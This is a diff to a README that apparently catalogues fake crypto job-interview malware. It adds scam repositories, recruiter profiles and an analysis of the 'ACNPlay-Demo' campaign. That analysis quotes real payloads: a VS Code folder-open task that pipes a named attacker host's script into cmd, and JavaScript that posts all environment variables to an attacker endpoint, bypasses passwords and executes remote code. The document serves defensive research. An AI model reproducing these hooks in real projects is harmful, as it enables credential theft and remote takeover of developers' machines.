@@ -75,6 +75,7 @@ The code is kept for educational and research purposes only.
 - https://bitbucket.org/testprodemo5/degame-protocol/src/main/
 - https://github.com/Peiko-Tech-Org/Peiko-Platform-MVP/
 - https://github.com/AgencySoft-LLC/AssetForge/
+- https://github.com/aitech-nexus/ACNPlay-Demo
   
 ### Known scammer recruiter profiles
 
@@ -99,6 +100,7 @@ The code is kept for educational and research purposes only.
 - [Adam Majoros](https://www.linkedin.com/in/adam-majoros-a73944105/)
 - [Janice Bennett](https://www.linkedin.com/in/janice-bennett5873033/) ("Senior Recruiter | Web3 & Crypto @ J-Soft Labs")
 - [Daniel Feit DMD CAGS MS FICD](https://www.linkedin.com/in/daniel-feit-dmd-cags-ms-ficd-90943937/) (hijacked dental professional profile, headline changed to "CTO at J-Soft Labs")
+- [Cecilia Díaz Cruz](https://www.linkedin.com/in/ceciliadic/) (Innovation Lead & Executive | Co-Founder & CEO | IT & Business Strategy Management)
 
 ## Extra Links
 
@@ -115,6 +117,8 @@ The code is kept for educational and research purposes only.
 - [Linkedin Scams Blog Post](https://www.himthe.dev/blog/linkedin-interview-scams)
 
 - [Test Requirements Docs](https://docs.google.com/document/d/1Ge5LJeA8IIRR9ckurhD5scGJaJnI-4cM51-8EbZZcMU/edit?tab=t.xhrrmhvuccxv)
+
+- [I Almost Got Owned By a Fake Web3 Poker Demo (12-Part Forensic Series) - on Linkedin](https://lnkd.in/dpdMgVgc)
 
 ## On Linkedin
 
@@ -782,6 +786,69 @@ Located in `test_project/` directory.
 GitHub user [@Doaxan](https://github.com/Doaxan) successfully decompiled the payload for this sample. The captured payload is preserved in `test_project/payload/`, in `payload.js`.
 
 > ⚠️ **DO NOT RUN.** This is live malicious code. Running live malware will ensure all of your credentials are stolen — or worse. Inspect it for research and analysis purposes only — do not execute it or install its dependencies.
+
+---
+
+### 16. ACNPlay-Demo (0xroaman Campaign)
+
+It targets Web3 and full-stack developers using a fake decentralized crypto poker project demo.
+
+Located in `ACNPlay-Demo/` directory.
+
+Malware audit report & information about fake demo in `ACNPlay-Demo/README.md`
+Quarantine in `ACNPlay-Demo/.MALWARE-QUARANTINE/originals`
+
+This incident and malware payload were analyzed and reported by GitHub user [@sergeymorozovdev](https://github.com/sergeymorozovdev).
+
+
+This repository utilized a **dual-vector** approach to compromise developer environments:
+
+Vector 1: VS Code Folder-Open Dropper
+*   **Location:** `.vscode/tasks.json`
+*   **Trigger:** `"runOn": "folderOpen"`
+*   **Target OS:** macOS, Linux, Windows
+*   **C2 Endpoint:** `quick-test-ashen.vercel.app` 
+
+**Payload Code (Windows Example):**
+```json
+// originals/tasks.json.orig
+{
+  "windows": {
+    "command": "curl --ssl-no-revoke -L https://quick-test-ashen.vercel.app/api/settings/windows | cmd"
+  },
+  "runOptions": { "runOn": "folderOpen" }
+}
+```
+*Analysis: Opening the folder in VS Code/Cursor triggers a silent download and execution of a shell script from the attacker's server.*
+
+
+2. Vector 2: Server-Side RCE & Environment Exfiltration
+*   **Trigger:** `npm install` (via `package.json` `"prepare"` script)
+*   **Exfil Target:** `project-mjecx.vercel.app/api`
+*   **Technique:** `process.env` theft + `eval()` execution
+
+**Payload Code:**
+```javascript
+// originals/controllers.auth.js.orig
+// 1. Backdoor: Accepts any password
+const isMatch = true; 
+
+// 2. Exfiltration: Steals all environment variables
+const verify = (api) =>
+  axios.post(api, { ...process.env }, {
+    headers: { "x-app-request": "ip-check" } // Disguised as health check
+  });
+
+// 3. Execution: Runs attacker's code with full server access
+const executor = new Function("require", response.data);
+executor(require);
+```
+*Analysis: The attacker steals API keys (Anthropic, etc.) and can execute arbitrary commands on the host machine.*
+
+**Incident Documentation:**
+A full 12-part technical and forensic audit detailing the infrastructure, malware deconstruction, and Threat Intel for this specific repository is available on LinkedIn: [I Almost Got Owned By a Fake Web3 Poker "Demo" (Forensic Series)](https://lnkd.in/dpdMgVgc).
+
+> ⚠️ **DO NOT RUN.** This directory contains neutralized, but highly dangerous code samples preserved in the `.MALWARE-QUARANTINE/` folder. Inspect it for research and analysis purposes only.
 
 ---
 
